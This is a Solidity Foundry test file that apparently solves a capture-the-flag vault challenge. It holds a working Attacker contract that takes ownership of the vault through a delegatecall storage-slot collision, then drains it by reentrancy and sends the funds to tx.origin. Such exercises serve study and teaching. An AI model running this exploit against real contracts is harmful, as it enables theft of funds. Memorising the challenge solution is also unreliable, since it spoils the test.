// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract Attacker {
    Vault public vault;
    uint256 public attackCount;
    uint256 constant MAX_ATTACKS = 11; // Need 11 attacks to drain 0.11 ether (0.1 initial + 0.01 our deposit)

    constructor(Vault _vault) {
        vault = _vault;
    }

    function attack(address logicAddress) external payable {
        // Step 1: Exploit delegatecall to become owner
        // When VaultLogic.changeOwner is called via delegatecall:
        // - VaultLogic slot 0 (owner) maps to Vault slot 0 (owner)
        // - VaultLogic slot 1 (password) maps to Vault slot 1 (logic address)
        // So the password check compares against the logic address stored in Vault!

        // The password is the logic address stored in Vault's slot 1
        bytes32 correctPassword = bytes32(uint256(uint160(logicAddress)));

        bytes memory data = abi.encodeWithSignature(
            "changeOwner(bytes32,address)",
            correctPassword,
            address(this)
        );
        (bool success, ) = address(vault).call(data);
        require(success, "Failed to become owner");

        // Step 2: Enable withdrawals
        vault.openWithdraw();

        // Step 3: Make a small deposit
        // The reentrancy vulnerability allows us to withdraw this amount multiple times
        // With MAX_ATTACKS=11, we withdraw 0.01 * 11 = 0.11 ether total
        // This drains the vault's 0.1 ether + our 0.01 ether deposit
        vault.deposite{value: 0.01 ether}();

        // Step 4: Start the reentrancy attack
        vault.withdraw();

        // Step 5: Transfer all stolen funds to tx.origin (the player)
        payable(tx.origin).transfer(address(this).balance);
    }

    // Reentrancy: called when receiving ETH during withdraw
    receive() external payable {
        attackCount++;
        // Continue draining while vault has balance and we haven't exceeded max attacks
        if (address(vault).balance > 0 && attackCount < MAX_ATTACKS) {
            vault.withdraw();
        }
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        Attacker attacker = new Attacker(vault);
        attacker.attack{value: 0.01 ether}(address(logic));

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}
